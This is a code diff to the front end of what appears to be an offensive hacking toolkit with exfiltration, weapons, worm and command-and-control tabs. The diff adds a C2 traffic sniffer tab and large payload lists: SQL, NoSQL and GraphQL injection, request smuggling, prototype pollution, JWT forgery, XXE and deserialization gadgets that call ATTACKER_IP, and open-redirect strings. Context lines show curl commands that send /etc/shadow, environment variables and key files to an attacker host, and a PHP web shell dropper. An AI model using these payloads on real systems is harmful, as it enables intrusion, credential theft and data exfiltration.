@@ -23,6 +23,7 @@ import ExfilPanel from "./ExfilPanel";
 import WeaponsPanel from "./WeaponsPanel";
 import IronWormPanel from "./IronWormPanel";
 import C2PollerPanel from "./C2PollerPanel";
+import C2TrafficSniffer from "./C2TrafficSniffer";
 import { useReconnectingWs } from "../hooks/use-reconnecting-ws";
 import { authHeaders, withAuthToken } from "../lib/auth";
 
@@ -106,7 +107,7 @@ const MODE_DESC: Record<string, string> = {
 };
 
 // ─── TABS ─────────────────────────────────────────────────
-const TABS = ["AUTOCHAIN","TERMINAL","SCANNER","FUZZER","SHELLS","ENCODER","LIBRARY","OOB","REPLAYS","CVE","MUTATION","DELIVER","PERSIST","REPORT","EXFIL","WEAPONS","IRONWORM","C2POLLER"] as const;
+const TABS = ["AUTOCHAIN","TERMINAL","SCANNER","FUZZER","SHELLS","ENCODER","LIBRARY","OOB","REPLAYS","CVE","MUTATION","DELIVER","PERSIST","REPORT","EXFIL","WEAPONS","IRONWORM","C2POLLER","C2SNIFFER"] as const;
 type Tab = typeof TABS[number];
 
 // ─── FUZZER ───────────────────────────────────────────────
@@ -126,7 +127,157 @@ const FUZZ_SETS: Record<string, string[]> = {
   "Concat Bypass":  ["i''d","ca''t","w'h'o'a'm'i","ba''sh","c\"\"at"],
   "Encoding":       ["$(echo aWQ=|base64 -d)","$(printf '\\x69\\x64')","$(printf '\\151\\144')"],
   "Path Abuse":     ["${PATH:0:1}etc${PATH:0:1}passwd","/???/pa?sw?","/${PATH:0:1}bin/cat /etc/passwd"],
+
+  // ── New attack surface coverage ──────────────────────────────────────
+  "HTTP Smuggling": [
+    "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost",
+    "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
+    "Transfer-Encoding: xchunked",
+    "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
+    "Transfer-Encoding:\x20chunked",
+    "GET / HTTP/1.1\r\nHost: a\r\nContent-Length: 44\r\n\r\nGET /admin HTTP/1.1\r\nHost: a\r\nFoo: x",
+    "POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
+  ],
+  "Prototype Pollution": [
+    "__proto__[admin]=true",
+    "__proto__[isAdmin]=true",
+    "constructor[prototype][admin]=1",
+    '{"__proto__":{"polluted":"yes"}}',
+    '{"constructor":{"prototype":{"polluted":"yes"}}}',
+    "__proto__.toString=function(){return 'pwned'}",
+    "?__proto__[evilKey]=evilVal",
+    "?constructor.prototype.admin=true",
+    '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}',
+    "__proto__[outputFunctionName]=_x3Bconsole.log(1)_x3B//",
+  ],
+  "JWT Bypass": [
+    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.',
+    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.XXXX',
+    'eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.',
+    'algorithm:none',
+    '{"alg":"none","typ":"JWT"}',
+    '{"alg":"HS256"}→RS256 confusion',
+    'kid: ../../dev/null',
+    'kid: ../../../../proc/self/environ',
+    'jku: http://attacker.com/jwk',
+    'x5u: http://attacker.com/cert.pem',
+    'iss: ../../../../etc/passwd',
+  ],
+  "GraphQL Inject": [
+    '{"query":"{ __schema { types { name } } }"}',
+    '{"query":"{ __type(name:\\"User\\") { fields { name } } }"}',
+    '{"query":"{ users { id email password } }"}',
+    '{"query":"mutation{login(user:\\"admin\\"password:\\"\\' OR \'1\'=\'1\\"){token}}"}',
+    '{"query":"{ user(id:\\"1 OR 1=1\\") { secret } }"}',
+    '{"query":"query{__typename @skip(if:false)}"}',
+    'query={user(id:"\\x27 OR \\x271\\x27=\\x271"){ email }}',
+    '{"query":"{ systemUpdate }"}',
+    '{"operationName":"IntrospectionQuery","query":"query IntrospectionQuery { __schema { queryType { name } } }"}',
+  ],
+  "CRLF Inject": [
+    "%0d%0aSet-Cookie: admin=true",
+    "%0d%0aLocation: http://evil.com",
+    "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK",
+    "\r\nSet-Cookie: session=evil",
+    "%0aSet-Cookie: pwned=1",
+    "foo%0d%0abar: baz%0d%0a",
+    "X-Custom: val%0d%0aX-Injected: pwned",
+    "%0d%0aX-Auth-Token: 1337",
+    "%E5%98%8A%E5%98%8DSet-Cookie: admin=1",
+    "value\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
+  ],
+  "NoSQL Inject": [
+    '{"$gt":""}',
+    '{"$ne":null}',
+    '{"$where":"sleep(1000)"}',
+    '{"username":{"$gt":""},"password":{"$gt":""}}',
+    'username[$ne]=admin&password[$ne]=x',
+    '{"$regex":".*"}',
+    '{"$or":[{"user":"admin"},{"user":"x"}]}',
+    '||}};db.getCollectionNames();var foo=[[',
+    'true, $where: \'1 == 1\'',
+    '{"$lookup":{"from":"users","localField":"id","foreignField":"_id","as":"x"}}',
+  ],
+  "Unicode Normalization": [
+    "%EF%B9%AB",
+    "\u202e",
+    "%c0%ae%c0%ae/etc/passwd",
+    "\uFEFF../etc/passwd",
+    "%u002e%u002e/etc/passwd",
+    "..%c1%9c..%c1%9cetc%c1%9cpasswd",
+    "\u0000../etc/passwd",
+    "%e2%80%ae.php",
+    "\u2024\u2024/etc/passwd",
+    "co\u0308m (looks like com)",
+  ],
+  "Cache Deception": [
+    "/api/user/data.css",
+    "/api/user/profile.js",
+    "/api/user/settings.json%2Fadmin",
+    "/api/admin/secret;.jpg",
+    "/api/secret/../public.html",
+    "/api/user%2Fprofile",
+    "/static/../api/admin",
+    "/api/orders/1.ico",
+    "/profile?cb=1234",
+    "X-Original-URL: /admin",
+    "X-Rewrite-URL: /admin",
+  ],
+  "Open Redirect": [
+    "//evil.com/%2F..",
+    "//\x09evil.com",
+    "https:evil.com",
+    "/%09/evil.com",
+    "/\\evil.com",
+    "///evil.com",
+    "http://0x7f000001/admin",
+    "http://[::1]/admin",
+    "//evil%E3%80%82com",
+    "javascript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+  ],
+  "WebSocket Inject": [
+    '{"type":"ping","data":"\\"};alert(1)//"}',
+    '{"cmd":"../../../etc/passwd"}',
+    '{"eval":"require(\'child_process\').exec(\'id\')"}',
+    '{"__proto__":{"admin":true}}',
+    '{"type":"sub","channel":"../../admin"}',
+    '{"message":"<img src=x onerror=alert(1)>"}',
+    '{"user":"admin\'--"}',
+    '{"query":"{ admin { secret } }"}',
+  ],
+  "XXE Chains": [
+    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
+    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % remote SYSTEM "http://ATTACKER_IP/evil.dtd"> %remote;]><x/>',
+    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><x>&xxe;</x>',
+    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % file SYSTEM "file:///etc/shadow"> <!ENTITY % eval "<!ENTITY &#37; error SYSTEM \'file:///&#37;file;\'>">>%eval;%error;]>',
+    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&xxe;</x>',
+  ],
+  "SQL Injection": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' UNION SELECT 1,2,3--",
+    "' UNION SELECT null,username,password FROM users--",
+    "' AND SLEEP(5)--",
+    "'; DROP TABLE users--",
+    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+    "' OR (SELECT 1 FROM (SELECT SLEEP(5))x)--",
+    "1; EXEC xp_cmdshell('id')--",
+    "' UNION SELECT load_file('/etc/passwd'),2,3--",
+    "'; INSERT INTO users VALUES('hack','hack','admin')--",
+    "1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
+  ],
+  "Race Condition": [
+    "(send 50 concurrent requests with identical nonce)",
+    "(send concurrent POST /api/transfer with same balance)",
+    "(send concurrent POST /api/promo/redeem)",
+    "(send concurrent DELETE + GET on same resource)",
+    "X-Race-Header: 1 (send × 50 simultaneous)",
+    "(parallel: POST /buy limit=1 × N threads)",
+  ],
 };
+
 
 // ─── PAYLOAD LIBRARY ──────────────────────────────────────
 const PAYLOAD_LIBRARY = [
@@ -308,6 +459,86 @@ const PAYLOAD_LIBRARY = [
     "cat /etc/shadow | openssl base64 | curl -sk -X POST http://ATTACKER_IP:ATTACKER_PORT/ -d @-",
     "env | base64 | curl -sk -X POST http://ATTACKER_IP:ATTACKER_PORT/ -d @-",
     "find / -name '*.key' 2>/dev/null | xargs cat | base64 | curl -sk -X POST http://ATTACKER_IP:ATTACKER_PORT/ -d @-",
+  ]},
+  { cat:"SQL INJECT",   col:"text-pink-500", p:[
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' UNION SELECT 1,2,3--",
+    "' UNION SELECT null,username,password FROM users--",
+    "' AND SLEEP(5)--",
+    "'; DROP TABLE users--",
+    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+    "' OR (SELECT 1 FROM (SELECT SLEEP(5))x)--",
+    "1; EXEC xp_cmdshell('whoami')--",
+    "' UNION SELECT load_file('/etc/passwd'),2,3--",
+    "1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
+    "' AND 1=1 UNION ALL SELECT table_name,null FROM information_schema.tables--",
+    "') OR ('a'='a",
+    "admin'--",
+    "1' ORDER BY 10--",
+  ]},
+  { cat:"NOSQL INJECT", col:"text-amber-400", p:[
+    '{"$gt":""}',
+    '{"$ne":null}',
+    '{"$where":"sleep(1000)"}',
+    '{"username":{"$gt":""},"password":{"$gt":""}}',
+    'username[$ne]=admin&password[$ne]=x',
+    '{"$regex":".*"}',
+    '{"$or":[{"user":"admin"},{"user":"x"}]}',
+    '{"$lookup":{"from":"users","localField":"id","foreignField":"_id","as":"x"}}',
+    "true, $where: '1 == 1'",
+    '{"title":{"$regex":".*secret.*"}}',
+    '{"password":{"$not":{"$size":0}}}',
+    'db.users.find({$where: function(){return this.password.length > 0}})',
+  ]},
+  { cat:"PROTO POLL",  col:"text-violet-400", p:[
+    "__proto__[admin]=true",
+    "__proto__[isAdmin]=true",
+    'constructor[prototype][admin]=1',
+    '{"__proto__":{"polluted":"yes"}}',
+    '{"constructor":{"prototype":{"polluted":"yes"}}}',
+    '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}',
+    "__proto__[outputFunctionName]=_x3Bconsole.log(1)_x3B//",
+    "?__proto__[evilKey]=evilVal",
+    '{"__proto__":{"toString":"function(){return \\'pwned\\'}"}}',
+    '{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=ATTACKER_IP:9229"}}',
+  ]},
+  { cat:"DESERIALIZATION", col:"text-orange-500", p:[
+    "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
+    "O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}",
+    "YToxOntzOjQ6InBpcGUiO3M6MjoiaWQiO30=",
+    "gASVJAAAAAAAAACMCnN1YnByb2Nlc3OUjAZQb3BlbpSTlIwCaWSUhZRSlC4=",
+    "\\xac\\xed\\x00\\x05sr",
+    '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER_IP:1389/Exploit","autoCommit":true}',
+    '{"@class":"java.lang.ProcessBuilder","command":["id"],"redirectErrorStream":true}',
+    '{"new":"java.io.BufferedReader","wrapped":{"new":"java.io.FileReader","wrapped":"/etc/passwd"}}',
+    "ruby: Marshal.load(Base64.decode64('BAhB...'))",
+    ".NET: BinaryFormatter SoapFormatter ViewState",
+  ]},
+  { cat:"MASS ASSIGN",  col:"text-teal-400", p:[
+    '{"admin":true}',
+    '{"role":"admin"}',
+    '{"isAdmin":true,"role":"superuser"}',
+    '{"_admin":true,"__admin":true}',
+    '{"$set":{"role":"admin"}}',
+    '{"user":{"admin":true}}',
+    'POST /register {username:a,password:b,admin:true}',
+    '{"group_ids":[1,2,3,999]}',
+    '{"balance":999999}',
+    '{"verified":true,"email_verified":true}',
+  ]},
+  { cat:"IDOR CHAINS",  col:"text-cyan-500", p:[
+    "GET /api/user/1 → try /api/user/2..1000",
+    "GET /api/orders/43f7a → try ../admin",
+    "GET /api/invoice?id=1 → id=0, id=-1, id=null",
+    "GET /api/file?name=report.pdf → name=../../etc/passwd",
+    "POST /api/transfer with to_account=attacker_id",
+    "GET /api/user?id=me → id=admin",
+    "GET /api/history?user=self → user=other_user_id",
+    "JWT sub=1 → forge sub=0 or sub=admin",
+    "DELETE /api/comment/MY_ID → try other IDs",
+    "PUT /api/profile → add extra fields: role, admin, verified",
   ]},
   { cat:"WEB SHELLS",  col:"text-green-400", p:[
     `echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php`,
@@ -1896,6 +2127,7 @@ export default function MainLab() {
         {tab==="WEAPONS"       && <WeaponsPanel />}
         {tab==="IRONWORM"      && <IronWormPanel />}
         {tab==="C2POLLER"     && <C2PollerPanel />}
+        {tab==="C2SNIFFER"    && <C2TrafficSniffer />}
           </div>
 
           {/* Bottom panel */}
